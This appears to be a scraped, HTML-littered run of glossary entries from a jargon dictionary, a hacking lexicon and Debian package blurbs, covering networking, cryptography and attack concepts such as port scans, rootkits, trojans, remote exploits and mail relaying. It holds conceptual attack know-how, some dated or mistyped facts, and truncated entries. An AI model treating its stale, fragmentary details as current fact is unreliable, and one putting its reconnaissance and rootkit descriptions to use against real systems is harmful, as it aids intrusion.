>&#13;[from the submariners' term for a sonar pulse] 1. n. Slang term for a small network message (ICMP ECHO) sent by a computer to check for the presence and alertness of another. The Unix command ping(8) can be used to do this manually (note that ping(8)'s author denies the widespread folk etymology that the name was ever intended as acronym for `Packet INternet Groper'). Occasionally used as a phone greeting. See ACK, also ENQ. 2. vt. To verify the presence of. 3. vt. To get the attention of. 4. vt. To send a message to all members of a mailing list requesting an ACK (in order to verify that everybody's addresses are reachable). "We haven't heard much of anything from Geoff, but he did respond with an ACK both times I pinged jargon-friends." 5. n. A quantum packet of happiness. People who are very happy tend to exude pings; furthermore, one can intentionally create pings and aim them at a needy party (e.g., a depressed person). This sense of ping may appear as an exclamation; "Ping!" (I'm happy; I am emitting a quantum of happiness; I have been struck by a quantum of happiness). The form "pingfulness", which is used to describe people who exude pings, also occurs. (In the standard abuse of language, "pingfulness" can also be used as an exclamation, in which case it's a much stronger exclamation than just "ping"!). Oppose blargh. The funniest use of `ping' to date was described in January 1991 by Steve Hayman on the Usenet group comp.sys.next. He was trying to isolate a faulty cable segment on a TCP/IP Ethernet hooked up to a NeXT machine, and got tired of having to run back to his console after each cabling tweak to see if the ping packets were getting through. So he used the sound-recording feature on the NeXT, then wrote a script that repeatedly invoked ping(8), listened for an echo, and played back the recording on each returned packet. Result? A program that caused the machine to repeat, over and over, "Ping ... ping ... ping ..." as long as the network was up. He turned the volume to maximum, ferreted through the building with one ear cocked, and found a faulty tee connector in no time.  From Jargon Dictionary

>&#13;n. [Unix] On systems that support finger, the `.plan' file in a user's home directory is displayed when the user is fingered. This feature was originally intended to be used to keep potential fingerers apprised of one's location and near-future plans, but has been turned almost universally to humorous and self-expressive purposes (like a sig block). See also Hacking X for Y. A recent innovation in plan files has been the introduction of "scrolling plan files" which are one-dimensional animations made using only the printable ASCII character set, carriage return and line feed, avoiding terminal specific escape sequences, since the finger command will (for security reasons; see letterbomb) not pass the escape character. Scrolling .plan files have become art forms in miniature, and some sites have started competitions to find who can create the longest running, funniest, and most original animations. Various animation characters include: Centipede: mmmmme Lorry/Truck: oo-oP Andalusian Video Snail: _@/ and a compiler (ASP) is available on Usenet for producing them. See also twirling baton.

>&#13;Polytechnique Montreal Modula-3 The Modula-3 distribution of Ecole Polytechnique de Montreal is based on the DEC SRC Modula-3 programming environment. Modula-3 is a systems programming language that descends from Mesa, Modula-2, Cedar, and Modula-2+. It also resembles its cousins Object Pascal, Oberon, and Euclid. The goal of Modula-3 is to be as simple and safe as it can be while meeting the needs of modern systems programmers. Instead of exploring new features, they studied the features of the Modula family of languages that have proven themselves in practice and tried to simplify them into a harmonious language. They found that most of the successful features were aimed at one of two main goals: greater robustness, and a simpler, more systematic type system. Modula-3 retains one of Modula-2's most successful features, the provision for explicit interfaces between modules. It adds objects and classes, exception handling, garbage collection, lightweight processes (or threads), and the isolation of unsafe features. A large number of platform independent libraries are available for easily constructing distributed, graphical, multi-threaded applications. From Debian 3.0r0 APT

>&#13;In TCP/IP, a port is an extension of an Internet address that tells which program is to receive the data. In other words, if I send data to 192.0.2.111, port 110, then I'm talking to the POP3 e-mail service. However, if I send something to port 80 on the same machine, then I'm talking to the web server on that machine. Key point: I can have two URLs that look like http://robertgraham.com/ and http://robertgraham.com/. These two URLs access different web server programs running on the same machine, one at port 80 and that other at port 90. Misconception: Many people believe that the port correctly identifies the protocol that runs on that port. For example, the port 110 has been assigned to the POP3 e-mail service. However, even though this is the correct port for the protocol, somebody could put a different service on this port, such as HTTP. In this example, I could then supply URLs that looked like http://www.robertgraham.com:110/. From Hacking-Lexicon

>&#13;On the Internet port often refers to a number that is part of a URL, appearing after a colon (:) right after the domain name. Every service on an Internet server listens on a particular port number on that server. Most services have standard port numbers, e.g. Web servers normally listen on port 80. Services can also listen on non-standard ports, in which case the port number must be specified in a URL when accessing the server, so you might see a URL of the form: gopher://peg.cwis.uci.edu:7000/ This shows a gopher server running on a non-standard port (the standard gopher port is 70). Finally, port also refers to translating a piece of software to bring it from one type of computer system to another, e.g. to translate a Windows program so that is will run on a Macintosh.

>&#13;port scan
</B
></DT
><DD
><P
>&#13;In hacker reconnaissance, a port scan attempts to connect to all 65536 ports on a machine in order to see if anybody is listening on those ports. Contrast: A stealth scan attempts to evade detection. The most common kind is a TCP half-open scan which fails to complete the three-way handshake. This prevents the application listening on a port from being notified that a connection attempt has taken place, so it won't log that fact. Most "stealth" scans attempt to evade logging on the host, but this makes more distinctive signatures that intrusion detection systems can detect. Key point: Ports scans are not illegal in many places, those laws have yet to be written on the subject. The Norwegian Supreme court ruled that they are not illegal because they don't actually compromise the system. There is also the technical problem that they can easily be spoofed, so it is hard to prove guilt. There is even the third problem that virtually any machine on the Internet can be tickled into scanning somebody else; the hacker doesn't break into that third party, but triggers special conditions that causes the effect of a port scan. Controversy: Many people think that port scanning is an overt hostile act and should be made illegal. Contrast: Full port scans of all 65536 ports are rarely seen, especially since they are so obvious. Instead, hackers will strobe for just the ports he/she is interested in. These strobes are for typically fewer than 10 ports. Also, the hacker will often sweep thousands (or millions) of machines rather than a single machine looking for any system that might be vulnerable. Tool: The best tool for doing port scans is nmap from http://www.insecure.org/nmap. From Hacking-Lexicon

>&#13;In the UNIX RPC protocol suite, portmapper is responsible for locating which port number a particular RPC-based service is using. RPC programs are assigned a well-known "RPC program number" rather than well-known ports. In the RPC suite, the only program that is assigned a "well-known" port is the portmapper service at port 111. All the rest obtain a randomly assigned port number when they start up, then tell portmapper which port they are using. For example, the rpc.mountd RPC program is assigned the well-known program number of 100005. When it starts up, it might obtain the port number like 635. It then registers with the local portmapper (on the same machine) and gives it the [100005,635] combination. When a client program whishes to contact rpc.mountd, it first contacts portmapper and asks "where is program 1000005?". Portmapper replies with the current port, at which point the client program proceeds to talk with rpc.mountd on the correct port. Key point: In theory, you must have access to port 111 on the target machine in order to reach any RPC service. Therefore, some firewall administrators block access to port 111 on the mistaken belief that this will protect them. This belief is wrong because while it prevents an intruder from easily finding the target RPC services, they can still hunt for them. Using nmap, an intruder can first do a port scan to find open ports, then use the "NULL proc grinding" feature of nmap to figure out which RPC is listening on that port. Also, sometimes Sun puts another portmapper at a high port (like 32773) From Hacking-Lexicon

It also supports some object-oriented features. As compared to MySQL, PostgreSQL is more fully featured - most importantly, PostgreSQL supports transactions on all tables, something which is essential to multi-user update of a database and referential integrity, which, equally, is essential to a reliable database.  The trade-off is that it can be slower, though again, each release sees improvements in efficiency. For more information, see &#60;http://OpenACS.org/why-not-mysql.html&#62;.

>&#13;The Project Revision Control System PRCS, the Project Revision Control System, is the front end to a set of tools that (like CVS) provide a way to deal with sets of files and directories as an entity, preserving coherent versions of the entire set.

It is possible for software to be commercial (that is, intended to make a profit for the producers) without being proprietary. The reverse is also possible, for example in binary-only freeware.

>&#13;Propagate X selections between displays propsel is useful to people who work with more than a single X11 display on their desk.  It allows one to paste into a xterm on one display the contents of the selection of another display.  For example, it's useful for situations where you have a URL on one display, and want to access it with a browser running on another display.  You can select the URL, click "propagate", move over to the other display, and then paste into the browser. If you have the two displays on the same desk, you might be more interested in the package x2x.  However, x2x can only link two displays at once, whereas propsel can propagate selections between up to 8 displays. From Debian 3.0r0 APT

>&#13;The rules that govern how things communicate over the network. Key point: By manipulating the protocol raw themselves, hackers can do powerful things that are impossible in an application. For example, client applications typically limit the length of a username that can be typed in. By manipulating the protocol raw, hackers can supply any sized username they want, sometimes causing a buffer overflow exploit. Key point: Protocols are either text-based or binary. Text-based protocols can be read directly off the wire and manipulated directly. Binary protocols require a protocol analyzer to decode them, and must be manipulated programmatically.

So, for example, it does include niceties about the proper form for addressing packets on a network or the order in which one should use the forks in the Dining Philosophers Problem.

>&#13;protocol stack
</B

>&#13;In networking, protocols are layered on top of each other, with each layer responsible for a different aspect of communication. For TCP/IP, the protocol stack looks something like: HTTP Telnet POP3 SNMP bootp TCP UDP ICMP IP ARP PPP Ethernet The way that you would use this diagram is the following paragraph: You use the protocol HTTP to request a web-page. The HTTP client (web-browser) contacts the HTTP server (web-site) using the protocol TCP. The protocol TCP segments all its work into IP packets. Routers on the Internet know how to forward the IP packets, but are clueless as to whatever is inside the IP packets. Your machine will use something like PPP or Ethernet in order to send IP packets to the nearest router. Key point: Encryption can happen at any layer. Payload The data itself can be encrypted independent of the protocols used to transport it. For example, a typical use of PGP is to encrypt a message before sending via e-mail. All the e-mail programs and protocols are totally unaware that this has occurred. Application Layer Some applications have the ability to encrypt data automatically. For example, SMB can encrypt data as it goes across the wire Transport Layer SSL is essentially encryption at the transport layer. Network Layer IPsec provides encryption at the network layer, encrypting all the contents above IP, including the TCP and UDP headers themselves. From Hacking-Lexicon

><P
>&#13;In communications, a proxy is something that acts as a server, but when given requests from clients, acts itself as a client to the real servers. Analogy: Consider talking to somebody who speaks a foreign language through a translator. You talk to the translator, who receives your statements, then regenerates something else completely to the other end. The translator serves as your proxy. Key point: The communication terminates at the proxy. In other words, the proxy doesn't forward data so much as it tears it completely apart. For example, an HTTP proxy doesn't forward every request sent through it. Instead, it first examines if it already has the requested web page in its cache. If so, then it returns that page without sending another request to the destination server. Because proxies completely terminate the communication channel, they are considered a more secure firewall technology than packet filters, because they dramatically increase the isolation between the networks. Key point: You will occasionally be scanned for proxies. ISPs scan their users for proxies. Hackers scan the Internet looking for proxies they can anonymize their connections with. Certain servers (like IRC servers) scan clients for proxies in order to prevent anonymous connections. Several websites maintain lists of such proxies. e.g. http://proxys4all.cgi.net/ From Hacking-Lexicon

</B
></DT
><DD
><P
>&#13;Public-key cryptography uses two mathematically related keys, where a message encrypted by one key can only be decrypted by the other key. This is in stark contrast to traditional cryptography (now known as symmetric cryptography) where the same key was used for both encryption and decryption. The reason this is so important is because one of the two keys can be made public, hence the name "public-key cryptography". When this technique was discovered, it solved the biggest problem in cryptography at that time. In traditional symmetric cryptography, both the sender and receiver of a message had to agree upon the same key. Imagine your country has spies out in the field. If a spy gets captured, then the adversary could steal that key and decrypt messages. With asymmetric keys, however, the enemy can only steal the key the spy is using to encrypt messages, but cannot use that key to decrypt anything. The enemy may be able to forge messages, but the system wouldn't otherwise be compromised. Furthermore, the key could be extremely public: you could simply broadcast your public-key on the open airwaves for your spies to use. This is indeed what happens with SSL, the protocol you use to connect to e-commerce sites and pay for stuff with credit-cards. The public-key of the server is given out to everybody who connects to the site. However, each user encrypts his data using the public-key, which means nobody else can decrypt it without the secret private-key known only to the owners of the website. Example: Some uses of public-key encryption are: e-mail encryption Allows anybody to send an encrypted message to you that only you can read. The two most popular ways of doing this are PGP and S/MIME. digital signatures You can encrypt something with your private-key that can be decrypted by everyone (using your public-key). Therefore, if you encrypt a message, it proves it came from you, because only you know the private-key. Thus, you can digitally "sign" documents. President Clinton signed the "Electronic Signatures in Global and National Commerce Act" into law using a digital signature in this manner (using a smart-card with the password "Buddy"). Point: The public and private keys are mathematically related. In order to create them, you start with some randomly generated prime numbers. You then run these through some mathematical operations in order to generate the two keys. You publish one of the keys (making it "public") and you keep the other one private. Since the keys are rather large (hundreds of bytes), you generally store them in an encrypted file. Whenever you need to decrypt a message, you type in a password to decrypt the private-key, then use the private-key to decrypt the message. Key point: Protecting the "private key" from theft/disclosure is the most important thing any company can do. There is exist private keys whose value lie in the range of hundreds of millions if not billions of dollars (such as the key Verisign uses to sign certificates). The private key is usually protected with strong encryption based upon a strong password. In paranoid cases, parts of the password are given to different people, so that more than one person must be present in order to recover the private key for use (note: redundancy is also used, if the key is XYZ, then Alice knows XY, Bob knows YZ, and Charlene knows XZ, meaning that any two can unlock the private key). The paranoid things you see in movies about high-security installations apply: background checks on employees with access to the private key physical security consisting of photo IDs, searches, and strict entry/exit controls the two-person rule biometrics (retina/palm/finger/handwriting) additions to normal authentication physical keys Private-keys are frequently stored on separate objects. The most common is the floppy disk, which can be inserted into a server when booted, but removed to a safety deposit box. Other examples include crypto-cards. (Note: when you get a certificates from a CA, they usually require that the private-key never be stored on a computer). Servers that must use private keys must employ heavy countermeasures: intrusion detection systems firewalls (both packet filtering as well as more complex ones) frequent vulnerability assessments and auditing limited people who have access to the server full use of the security features of the server (i.e. turn on logging, enforce strong passwords, etc.) Example: Some public-key algorithms are: Diffie-Hellman The original one, though only designed for key-exchange. RSA The most popular algorithm. ElGamal Extends Diffie-Hellman algorithms to support the same features as RSA, such as encryption and digital-signatures. DSA Government standard for digital-signatures based upon ElGamal. Elliptic Curves Based upon a different mathematical problem from number theory and algebraic geometry. It results in smaller keys and faster operation, but is not as well analyzed as other systems. Other There are other systems based upon different hard-to-solve mathematical problems. Antonym: Sometimes the word "secret-key" is used as an antonym to "public-key" in order to highlight the fact that it is a shared-secret. Also, "symmetric" encryption is the antonym to "asymmetric".

This reverse engineered version is known as "Arcfour" or "ARC4", which stands for "Alleged RC4". It isn't patented. Therefore, RSA Inc. is trying to move all its customers to RC5, which is both patented and copyrighted.

>&#13;Overview of RCS. RCS, the revision control system, is a suite of programs that tracks changes in text files and controls shared access to files in work group situations. It is generally used to maintain source code modules. It lends itself to tracking revisions of document files as well. RCS was written by Walter F. Tichy and Paul Eggert. The latest version which has been ported to Linux is RCS Version 5.7. There is also a semi-official, threaded version available. Much of the information in this HOWTO is taken from the RCS man pages. RCS includes the rcs(1) program, which controls RCS archive file attributes, ci(1) and co(1), which check files in and out of RCS archives, ident(1), which searches RCS archives by keyword identifiers, rcsclean(1), a program to clean up files that are not being worked on or haven't changed, rcsdiff(1), which runs diff(1) to compare the revisions, rcsmerge(1), which merges two RCS branches into a single working file, and rlog(1), which prints RCS log messages. Files archived by RCS may be text of any format, or binary if the diff program used to generate change files handles 8-bit data. Files may optionally include identification strings to aid in tracking by ident(1). RCS uses the utilities diff(1) and diff3(3) to generate the change files between revisions. A RCS archive consists of the initial revision of a file, which is version 1.1, and a series of change files, one for each revision. Each time a file is checked out of an archive with co(1), edited, and checked back into the archive with ci(1), the version number is increased, for example, to 1.2, 1.3, 1.4, and so on for successive revisions. The archives themselves commonly reside in a ./RCS subdirectory, although RCS has other options for archive storage. For an overview of RCS, see the rcsintro(1) manual page. From RCS-HOWTO

>&#13;/R-F-C/ n. [Request For Comment] One of a long-established series of numbered Internet informational documents and standards widely followed by commercial software and freeware in the Internet and Unix communities. Perhaps the single most influential one has been RFC-822 (the Internet mail-format standard). The RFCs are unusual in that they are floated by technical experts acting on their own initiative and reviewed by the Internet at large, rather than formally promulgated through an institution such as ANSI. For this reason, they remain known as RFCs even once adopted as standards. The RFC tradition of pragmatic, experience-driven, after-the-fact standard writing done by individuals or small working groups has important advantages over the more formal, committee-driven process typical of ANSI or ISO. Emblematic of some of these advantages is the existence of a flourishing tradition of `joke' RFCs; usually at least one a year is published, usually on April 1st. Well-known joke RFCs have included 527 ("ARPAWOCKY", R. Merryman, UCSD; 22 June 1973), 748 ("Telnet Randomly-Lose Option", Mark R. Crispin; 1 April 1978), and 1149 ("A Standard for the Transmission of IP Datagrams on Avian Carriers", D. Waitzman, BBN STC; 1 April 1990). The first was a Lewis Carroll pastiche; the second a parody of the TCP-IP documentation style, and the third a deadpan skewering of standards-document legalese, describing protocols for transmitting Internet data packets by carrier pigeon. The RFCs are most remarkable for how well they work -- they manage to have neither the ambiguities that are usually rife in informal specifications, nor the committee-perpetrated misfeatures that often haunt formal standards, and they define a network that has grown to truly worldwide proportions.

>&#13;RPC (Remote Procedure Call)
</B
></DT
><DD
><P
>&#13;A popular UNIX network protocol, RPC allows programs on one machine to make a "procedure" call on another machine. The upshot of this is that you could split a program in two halves, each part running on a separate machine. The procedure calls are invisibly mapped so that the programmer doesn't have to worry about the details. Contrast: The oldest form of RPC in use is Sun's RPC, upon which many famous protocols (such as NFS) are based. A newer form known as DCE RPC is used by Microsoft as the basis for its RPC services. The DCE version is dramatically more complex than the Sun variant, but supplies more services (such as built-in security). History: In the year 1999 (and early 2000), a wave of hacker attacks against Sun's RPC services swept the net. Virtually any Sun box connected to the net whose default RPC services were enabled, was hackable. Many Linux boxes were also hackable through RPC-based services. Virtually all of these attacks where through buffer overflow exploits. Example: Some RPC services are: portmapper Forms the core of the RPC system allowing a client to find servers. NFS This is the best known of all RPC services. Virtually all "file servers" use either Sun's NFS (in the UNIX world) or Microsoft's SMB (in the Windows world). Whenever one UNIX system is sharing a filesystem with another UNIX system, you can bet that they are using NFS. The name "NFS" means both the specific protocol called "NFS", but also the entire suite of supporting protocols like "mountd", "statd", and "lockd". rpc.mountd The "mount" sub-protocol of the NFS suite is used by a client to connect to the file service. It is named after the "mount" command in UNIX that is used to connect any filesystem into the main directory structure. This includes not only remote filesystems from NFS, but also floppy disks, CD-ROM drives, other partitions on the same hard-disk, or other hard-disks. Exploit: In 1998/1998 timeframe, a buffer-overflow in a Linux rpc.mountd implementation led to widespread compromises. See also: showmount rpc.statd Monitors the status of files; bugs in Linux and Solaris version have led to widespread exploits in 1998 through 2001. From Hacking-Lexicon

>&#13;RSA is the name of the most prevalent public/private key algorithm. It is also the name of the company (RSA Security) that originally held the patent rights to this system. It was invented in 1977 by Ron Rivest, Adi Shamir, and Leonard Adleman. Details: In order to generate the keys: First, some random data is generated. Most of the successful attacks against RSA implementations have been against this step. Two large primes are randomly chosen. This can be a time consuming step as the computer randomly generates numbers and tests to see if they are prime. These two numbers are traditionally called p and q. The two numbers are multiplied together, n = pq. We will be publishing n as part of the public-key. The security of RSA lies in the fact that it is computationally too difficult to factor n back into p and q. (However, somebody may in the future discover a way to easily factor large numbers, in which case all of today's cryptography will be rendered useless in one fell swoop). A number e is chosen, where e is less than n and "relatively prime" (no common factors) to (p-1)(q-1). The public-key will consist of the pair (n,e). A number d is chosen, where (ed-1) is divisible by (p-1)(q-1). The private-key consists of the pair (n,d). Usually, the original prime numbers p and q are discarded after this step. The numbers n, e, and d are of interest because they serve as fields within digital certificates. Details: In order to encrypt/decrypt something using RSA, the following algorithm is used. Start with the original message called m. Note that in reality, we've already encrypted the real message with a randomly generated symmetric key, and we really are just encrypting this key to send along with the encrypted message. Public-key cryptography is generally used for key-exchange because it is too slow for general-purpose encryption. Therefore, m is really just a small 128-bit key rather than the entire message. Create the ciphertext c using the equation c = me mod n, where (n,e) are the public-key. Send the ciphertext message c. Upon reception, use the equation m = cd mod n, where (n,d) is the private-key and m is the decrypted message. (Again, this is usually just the symmetric key that we will use to decrypt the actual message). Point: RSA forms the basis for X.509 certificates in web servers and browsers. Key point: RSA Security charges a hefty license to use the RSA algorithm. However, the patent expires in September of the year 2000. At that time, the number of products using the RSA algorithm are likely to explode. Key point: An alternative to RSA is the "Diffie-Hellman" algorithm. This is used in many cases, but it is hampered by the fact that many products that could use it (like Netscape and Microsoft browsers) do not; for interoperability you often need to use RSA over DH. History: When exporting RSA was illegal, a popular form of disobedience would be to wear T-shirts with the algorithm or us it as part of your .sig. #!/bin/perl -sp0777i&#60;X+d*lMLa^*lN%0]dsXx++lMlN/dsM0&#60;j]dsj $/=unpack('H*',$_);$_=`echo 16dio\U$k"SK$/SM$n\EsN0p[lN*1lK[d2%Sa2/d0$^Ixp"|dc`;s/\W//g;$_=pack('H*',/((..)*)$/) Applications: PGP, SSL, SET, DNSSEC, SSH See also: DSA From Hacking-Lexicon

This is not the source code that RSA sells to vendors, but an open-source version that has been imbedded within freeware/open-source products (like ssh). A patent-license is still required when using this code in commercial products, though. Key point: RSAREF has been supported by RSA (the company) for a long time, and a number of security holes have been found in this implementation. RSA wants people to use the BSAFE development kit instead. In late 1999 in particular, a bug was found that allows ssh to be hacked. From Hacking-Lexicon

R is designed as a true computer language with control-flow constructions for iteration and alternation, and it allows users to add additional functionality by defining new functions. For computationally intensive tasks, C, C++ and Fortran code can be linked and called at run time.

There is a big difference between "Remote Access Session" and other remote security audit tools: If "Remote Access Session" find a remote vulnerability that gives user account or root, it will try to exploit it and it will return a shell in order to discard false positives. It is actually under development and it just has a few features of the future final version:  *Advanced scanning capabilities. This tool doesn't block against   firewall and it's fast.  *Total service's banner info added: Includes web server detection   version and named version, and the classical too (ftp, pop ...)  *Writes reports with info of the host analyzed to the hard disk.  *Remote OS detect feature with QueSO.  *If detects any vulnerability, the tool chooses the right exploits   based on version, vendor and OS of the services that run on the   remote host and ask you on a interactive way if you want to run   these exploits in order to check the real danger the remote host   can receive and discard false positives.

"The program has a random set of misfeatures." "That's a random name for that function." "Well, all the names were chosen pretty randomly." 5. In no particular order, though deterministic. "The I/O channels are in a pool, and when a file is opened one is chosen randomly." 6. Arbitrary. "It generates a random name for the scratch file." 7. Gratuitously wrong, i.e., poorly done and for no good apparent reason. For example, a program that handles file name defaulting in a particularly useless way, or an assembler routine that could easily have been coded using only three registers, but redundantly uses seven for values with non-overlapping lifetimes, so that no one else can invoke it without first saving four extra registers. What randomness! 8. n. A random hacker; used particularly of high-school students who soak up computer time and generally get in the way. 9. n. Anyone who is not a hacker (or, sometimes, anyone not known to the hacker speaking); the noun form of sense 2. "I went to the talk, but the audience was full of randoms asking bogus questions". 10. n. (occasional MIT usage) One who lives at Random Hall. See also J. Random, some random X. 11.

On receiving a spam, a Razor Reporting Agent (run by an end-user or a troll box) calculates and submits a 20-character unique identification of the spam (a SHA Digest) to its closest Razor Catalogue Server. The Catalogue Server echos this signature to other trusted servers after storing it in its database. Prior to manual processing or transport-level reception, Razor Filtering Agents (end-users and MTAs) check their incoming mail against a Catalogue Server and filter out or deny transport in case of a signature match.

>&#13;Backup program to use deltas for history rdiff-backup is a script that backs up one directory to another. The target directory ends up a copy of the source directory, but extra reverse diffs are stored in a special subdirectory of that target directory, so you can still recover files lost some time ago. The idea is to combine the best features of a mirror and an incremental backup. rdiff-backup also preserves subdirectories, symlinks, special files, permissions, uid/gid ownership (if it is running as root), and modification times. Finally, rdiff-backup can operate in a bandwidth efficient manner over a pipe, like rsync. Thus you can use rdiff-backup and ssh to securely back a hard drive up to a remote location, and only the differences will be transmitted. From Debian 3.0r0 APT

This is especially a problem for compiler-writers, because their generated code needs places to store temporaries for things like intermediate values in expression evaluation. Some designs with this problem, like the Intel 80x86, do have a handful of special-purpose registers that can be pressed into service, providing suitable care is taken to avoid unpleasant side effects on the state of the processor: while the special-purpose register is being used to hold an intermediate value, a delicate minuet is required in which the previous value of the register is saved and then restored just before the official function (and value) of the special-purpose register is again needed.

>&#13;E-mail relay is where spammers hijack an e-mail server in order to forward their spam through the server. Usually, the spammer (from the Internet) sends the e-mail server a single e-mail with thousands of recipients. Similarly, any open USENET server can be hijacked to relay spam to newsgroups. Key point: This allows a spammer with a dial-up account to send e-mail as fast as a high-speed Internet connection, since it is the victim who breaks apart the recipient list and sends each person a separate copy. Therefore, one e-mail goes into the server, thousands come out. Key point: Relaying can be turned off in the e-mail server configuration. Such configuration will force the server to accept either incoming mail, or outgoing mail, but not incoming e-mail destined back out to the Internet. There are several sites on the Internet that will scan your corporate e-mail server to see if will relay spam. Key point: Some e-mail relays are completely open, others are closed to open relaying, but have bugs that can be exploited in order to relay spam.

>&#13;Emacs mode to help find relevant texts The Remembrance Agent is one of the projects being developed by the MIT Media Lab's software agents group.  Given a collection of the user's accumulated email, usenet news articles, papers, saved HTML files and other text notes, it attempts to find those documents which are most relevant to the user's current context.  That is, it searches this collection of text for the documents which bear the highest word-for-word similarity to the text the user is currently editing, in the hope that they will also bear high conceptual similarity and thus be useful to the user's current work. These suggestions are continuously displayed in a small buffer at the bottom of the user's emacs buffer.  If a suggestion looks useful, the full text can be retrieved with a single command.

>&#13;remote (remote attack, remote exploit)
</B
></DT
><DD
><P
>&#13;A common way to classify attacks is whether they are done remotely by a hacker from across the Internet, or whether they are done locally by a user who already has privileges on the system. The important difference is that a "remote" attack can be launched by any of the hundreds of the of millions of people on the Internet at any time without first logging on. Point: A hacker may need to use a combination of remote and local exploits in order to gain control over a system. More and more services are running within sandboxes in order to limit the "spread of the infection". A local exploit may be needed in order to break out of the sandbox. Key point: The most common remote exploits are buffer overflow and other unchecked input attacks. They are either done against public services (such as HTTP and FTP) or during the logon of protected services (such as POP and IMAP). From Hacking-Lexicon

>&#13;remote administration trojan (RAT)
</B
></DT
><DD
><P
>&#13;A trojan that when run, provides a hacker remote administration to the machine. Contrast: A trojan is any program with a hidden intent. A RAT is one whose hidden intent is to remotely control the machine. In particular, once the program is run and installs itself as a hidden background service, it ceases to a trojan in the classic sense and is now better thought of as a rootkit. Example: Back Orifice, NetBus, SubSeven, Hack'a'tack Contrast: A remote administration trojan is not a virus. The general populace uses the word virus to apply to any hostile program a hacker might use. Normally, being a purist using the correct word is futile, but in this case the distinction is important. You catch viruses accidentally, and the virus rarely does anything hostile to your system. Conversely, when a hacker attempts to infect your system with a remote administration trojan, the hacker is attacking you personally. Key point: Infections by remote administration Trojans on Windows machines are becoming as frequent as viruses. One common vector is through File and Print Sharing, when home users inadvertently open up their system to the rest of the world. If a hacker has access to the hard-drive, he/she can place the trojan in a location known as the startup folder. This will run the trojan the next time the user logs in. Another common vector is when the hacker simply e-mails the trojan to the user along with a social engineering hack that convinces the user to run it against their better judgment.

>&#13;A replay attack is a type of sniffer attack where the traffic is captured then retransmitted back at a computer. Analogy: In the 1992 movie Sneakers, the victim uses a voice identification system. Therefore, the heroes record the voice of one of the victim's employees, edit it with a computer, then play it back into the voice recognition system. Key point: It seems the first generation of any security architecture is vulnerable to replay attacks. For example, IPsec was original vulnerable to some replay attacks, even though it had provisions against the most obvious ones. Key point: The anti-replay remedy is to include a timestamp with a message. This then implies that everyone needs to have their clocks synchronized in order to communicate correctly.

><P
>&#13;A technique whereby the hacker attempts to discover secrets about a program. Some reverse engineering techniques are: strings Dumps all the human-readable strings within a program. In 1999, hackers looked for "strings" within Microsoft's products and found something labeled NSA_KEY. This led the paranoid delusion that the NSA had somehow convinced Microsoft to put a backdoor key into the system. Similarly, early in year 2000, hackers discovered strings like GetPrivateProfileString in the BlackICE Defender personal firewall and made paranoid assumptions (in reality, GetPrivateProfileString is a standard Win32 function). The most commonly used tool for this is the program strings included with UNIX. disassemble Takes the compiled output of a program and retrieves the original assembly language mnemonics, which are easier for humans to read. For example, the byte "0x90" might be converted back into NOOP (no operation) instruction. An example of using this technique to discover code being sent across the wire is at http://www.robertgraham.com/pubs/aol-exploit. The problem with disassembly is that it only makes the object files slightly more readable -- it doesn't reconstruct the full original source code or comments. decompile Decompilation produces high-level source code from an executable. The technique has proven essentially worthless for languages like C/C++, but works well on languages like Java, VisualBasic, and Delphi. It still doesn't obtain the original comments, however. Reverse engineering is often used to: anti-virus Discover how viruses work in order to write more effective signatures against them. cracking serialz Figuring out how copy protection works in order to break it.

>&#13;A program documentation tool. The idea is to include for every function or procedure a standard header containing all sorts of information about the procedure or function. ROBODoc extracts these headers from the source file and puts them in a separate autodocs-file.  ROBODoc thus allows you to include the program documentation in the source code and avoid having to maintain two separate documents.  Or as Petteri puts it: "robodoc is very useful - especially for programmers who don't like writing documents with Word or some other strange tool." ROBODoc can format the headers in a number of different formats: HTML, ASCII, AmigaGuide, LaTeX, or RTF. In HTML mode it can generate cross links between headers. You can even include parts of your source code. ROBODoc works with many programming languages: For instance C, Pascal, Shell Scripts, Assembler, COBOL, Occam, Postscript, Forth, Tcl/Tk, C++, Java -- basically any program in which you can use remarks/comments.

>&#13;The name for a kit of hacker utilities placed on a UNIX machine after a successful compromise. A typical rootkit includes: password sniffer log cleaners replacement binaries for common programs on the system (e.g. inetd) backdoor programs replacements to programs like ls and find so that they will not reveal the presence of the rootkit files. Key point: A rootkit contains many trojaned programs. These programs are used to allow the hacker entry back into the system and to hide the presence of the hacker. For example, a trojaned "ps" command might hide the hacker's sniffer daemon from appearing in the process list. Alternatively, the hacker might trojan an existing daemon like inetd to run a background sniffer. Key point: The most important trojaned programs are those that deal with gaining access back into the system with a special password. Therefore, trojaned versions of login daemon, su, or telnetd are needed. Key point: Rootkits often contain setuid programs that normal users can run in order to elevate their privileges to root. Look for these in order to see if your system has been hacked. Culture: Also called "daemon kits". Example: The "t0rn" kit, including utilities like "t0rnsniff" and replacement binaries.

>&#13;A tool for building complete Linux filesystem images Rootstrap was originally written to provide a facility for building filesystems for use with User-mode Linux, but can be useful in other applications as well. It uses a modular set of shell scripts to create the filesystem image, install a base system, and customize it for a particular application.  Currently, it only builds Debian systems, but the architecture is such that other base systems could be used instead. Use of rootstrap does not require root access, or special privileges of any kind.  This is because it builds the filesystem inside a User-mode Linux system running under an unprivileged uid. Filesystem creation with rootstrap is quick and painless.  With a local mirror and a single command, a fresh Debian woody filesystem can be created in about 3 minutes on relatively modest hardware.

It is used to enclose the text in a sealed wrapper that the reader must choose to open -- e.g., for posting things that might offend some readers, or spoilers.

>&#13;A cache which uses differences to speed up retrievals rproxy stores hashed values of retrieved pages and when you next access the same page it computes the difference between the current page and the recently stored page. The rproxy extensions to HTTP allow the server to generate a hsync relative to the cached instance in a way that is completely general, and transparent to both the server and user agent. rproxy, and clients and servers which implement hsync, calculate a block-by-block signature of the file, by computing a checksum over consecutive extents of equal length, such as 1024 bytes. This checksum is then added into a header of the request and transmited as usual. To be useful, there should be at least two rproxy instances between the client and the server. Transfers between the proxies will be delta-encoded, while the browser and server will just see standard HTTP. For example, it is very useful to run on instance on each side of a modem link, so that data across the slow link will be delta-encoded.

